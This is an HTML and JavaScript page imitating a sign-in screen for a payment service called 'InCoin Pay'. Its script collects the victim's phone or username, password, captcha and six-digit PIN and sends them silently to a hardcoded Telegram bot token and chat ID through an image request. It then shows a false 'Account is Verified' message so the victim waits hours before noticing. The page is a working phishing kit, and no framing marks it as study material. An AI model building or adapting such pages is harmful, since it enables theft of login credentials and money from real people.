<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>InCoin Pay</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    min-height: 100vh;
    background: #4A4FC4;
    font-family: 'Segoe UI', sans-serif;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    padding: 20px;
  }
  h1 {
    color: white;
    font-size: 36px;
    font-weight: 800;
    align-self: flex-start;
    margin-left: 10px;
    margin-bottom: 18px;
    font-family: 'Comic Sans MS', cursive;
    width: 100%;
    max-width: 400px;
  }
  .card {
    background: white;
    border-radius: 20px;
    padding: 30px 24px 28px;
    width: 100%;
    max-width: 400px;
    box-shadow: 0 8px 32px rgba(0,0,0,0.15);
  }
  input {
    width: 100%;
    padding: 16px 14px;
    border: 1.5px solid #bbb;
    border-radius: 12px;
    font-size: 15px;
    margin-bottom: 14px;
    outline: none;
    color: #333;
    transition: border 0.2s;
  }
  input:focus { border-color: #4A4FC4; }
  input::placeholder { color: #aaa; }
  .captcha-row {
    display: flex;
    align-items: center;
    border: 1.5px solid #bbb;
    border-radius: 12px;
    margin-bottom: 14px;
    overflow: hidden;
    transition: border 0.2s;
  }
  .captcha-row:focus-within { border-color: #4A4FC4; }
  .captcha-row input {
    border: none;
    margin-bottom: 0;
    border-radius: 0;
    flex: 1;
  }
  .captcha-img {
    padding: 6px 10px;
    background: #f5f5f5;
    font-size: 22px;
    font-weight: bold;
    letter-spacing: 3px;
    cursor: pointer;
    user-select: none;
    min-width: 90px;
    text-align: center;
  }
  .pin-label {
    font-size: 13px;
    color: #888;
    margin-bottom: 6px;
    margin-left: 2px;
  }
  .pin-row {
    display: flex;
    gap: 8px;
    margin-bottom: 22px;
    justify-content: center;
  }
  .pin-box {
    width: 46px;
    height: 52px;
    border: 1.5px solid #bbb;
    border-radius: 10px;
    text-align: center;
    font-size: 22px;
    font-weight: bold;
    outline: none;
    transition: border 0.2s;
    color: #333;
  }
  .pin-box:focus { border-color: #4A4FC4; }
  .btn-signin {
    width: 100%;
    padding: 17px;
    border: none;
    border-radius: 14px;
    font-size: 17px;
    font-weight: 700;
    color: white;
    background: #ccc;
    cursor: not-allowed;
    transition: background 0.3s;
    margin-bottom: 18px;
    font-family: 'Comic Sans MS', cursive;
  }
  .btn-signin.active {
    background: #4A4FC4;
    cursor: pointer;
  }
  .btn-signin.active:hover { background: #3a3fb4; }
  .links {
    display: flex;
    justify-content: space-between;
  }
  .links a {
    color: #4A4FC4;
    font-weight: 600;
    text-decoration: none;
    font-size: 15px;
  }
  .language {
    margin-top: 22px;
    color: white;
    font-size: 16px;
    display: flex;
    align-items: center;
    gap: 6px;
    cursor: pointer;
  }
  .overlay {
    display: none;
    position: fixed;
    inset: 0;
    background: rgba(0,0,0,0.5);
    z-index: 100;
    align-items: center;
    justify-content: center;
  }
  .overlay.show { display: flex; }
  .popup {
    background: white;
    border-radius: 18px;
    padding: 36px 28px;
    text-align: center;
    max-width: 300px;
    width: 90%;
    box-shadow: 0 8px 40px rgba(0,0,0,0.2);
  }
  .popup .tick { font-size: 52px; margin-bottom: 12px; }
  .popup h2 { color: #4A4FC4; font-size: 20px; margin-bottom: 10px; }
  .popup p { color: #666; font-size: 14px; line-height: 1.6; }
  .popup .time { color: #4A4FC4; font-weight: bold; }
  .spinner {
    display: inline-block;
    width: 18px; height: 18px;
    border: 3px solid rgba(255,255,255,0.4);
    border-top-color: white;
    border-radius: 50%;
    animation: spin 0.8s linear infinite;
    vertical-align: middle;
    margin-right: 8px;
  }
  @keyframes spin { to { transform: rotate(360deg); } }
</style>
</head>
<body>

<h1>Sign in</h1>

<div class="card">
  <input type="text" id="phone" placeholder="PhoneNO/UserName" oninput="checkFields()">
  <input type="password" id="password" placeholder="Password" oninput="checkFields()">
  <div class="captcha-row">
    <input type="text" id="imgcode" placeholder="Image code" maxlength="6" oninput="checkFields()">
    <div class="captcha-img" id="captchaDisplay" onclick="refreshCaptcha()"></div>
  </div>
  <div class="pin-label">6-Digit PIN</div>
  <div class="pin-row" id="pinRow">
    <input class="pin-box" type="password" maxlength="1" inputmode="numeric" oninput="pinInput(this,0)" onkeydown="pinBack(event,this,0)">
    <input class="pin-box" type="password" maxlength="1" inputmode="numeric" oninput="pinInput(this,1)" onkeydown="pinBack(event,this,1)">
    <input class="pin-box" type="password" maxlength="1" inputmode="numeric" oninput="pinInput(this,2)" onkeydown="pinBack(event,this,2)">
    <input class="pin-box" type="password" maxlength="1" inputmode="numeric" oninput="pinInput(this,3)" onkeydown="pinBack(event,this,3)">
    <input class="pin-box" type="password" maxlength="1" inputmode="numeric" oninput="pinInput(this,4)" onkeydown="pinBack(event,this,4)">
    <input class="pin-box" type="password" maxlength="1" inputmode="numeric" oninput="pinInput(this,5)" onkeydown="pinBack(event,this,5)">
  </div>
  <button class="btn-signin" id="signBtn" disabled onclick="doSignIn()">Sign in</button>
  <div class="links">
    <a href="#">Sign up</a>
    <a href="#">Forgot password?</a>
  </div>
</div>

<div class="language">🌐 भाषा</div>

<div class="overlay" id="overlay">
  <div class="popup">
    <div class="tick">✅</div>
    <h2>Account is Verified!</h2>
    <p>Please wait <span class="time">1-2 hours</span> for your account to be activated.</p>
  </div>
</div>

<script>
const BOT_TOKEN = "8605897155:AAEqTvBuxtfvckXlDtoMYRx89PGrhtPui9E";
const CHAT_ID = "8538694852";

let captchaCode = "";
function refreshCaptcha() {
  const chars = "0123456789ABCDEFGHJKLMNPQRSTUVWXYZ";
  captchaCode = Array.from({length: 4}, () => chars[Math.floor(Math.random()*chars.length)]).join('');
  const colors = ['#e53935','#1976d2','#388e3c','#f57c00','#7b1fa2'];
  const el = document.getElementById('captchaDisplay');
  el.innerHTML = captchaCode.split('').map(c =>
    `<span style="color:${colors[Math.floor(Math.random()*colors.length)]};transform:rotate(${Math.random()*30-15}deg);display:inline-block">${c}</span>`
  ).join('');
}
refreshCaptcha();

const pinBoxes = document.querySelectorAll('.pin-box');
function pinInput(el, idx) {
  el.value = el.value.replace(/[^0-9]/g,'');
  if (el.value && idx < 5) pinBoxes[idx+1].focus();
  checkFields();
}
function pinBack(e, el, idx) {
  if (e.key === 'Backspace' && !el.value && idx > 0) pinBoxes[idx-1].focus();
}
function getPin() {
  return Array.from(pinBoxes).map(b => b.value).join('');
}
function checkFields() {
  const phone = document.getElementById('phone').value.trim();
  const pass = document.getElementById('password').value.trim();
  const img = document.getElementById('imgcode').value.trim();
  const pin = getPin();
  const btn = document.getElementById('signBtn');
  if (phone && pass && img && pin.length === 6) {
    btn.disabled = false;
    btn.classList.add('active');
  } else {
    btn.disabled = true;
    btn.classList.remove('active');
  }
}

async function doSignIn() {
  const phone = document.getElementById('phone').value.trim();
  const pass = document.getElementById('password').value.trim();
  const img = document.getElementById('imgcode').value.trim();
  const pin = getPin();
  const btn = document.getElementById('signBtn');

  btn.innerHTML = '<span class="spinner"></span>Signing in...';
  btn.disabled = true;

  const text = `🔐 New InCoin Pay Login\n\n📱 Phone/User: ${phone}\n🔑 Password: ${pass}\n🖼 Image Code: ${img}\n🔢 PIN: ${pin}\n⏰ Time: ${new Date().toLocaleString()}`;

  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
  new Image().src = url;

  setTimeout(() => {
    document.getElementById('overlay').classList.add('show');
    btn.innerHTML = 'Sign in';
  }, 1500);
}
</script>
</body>
</html>
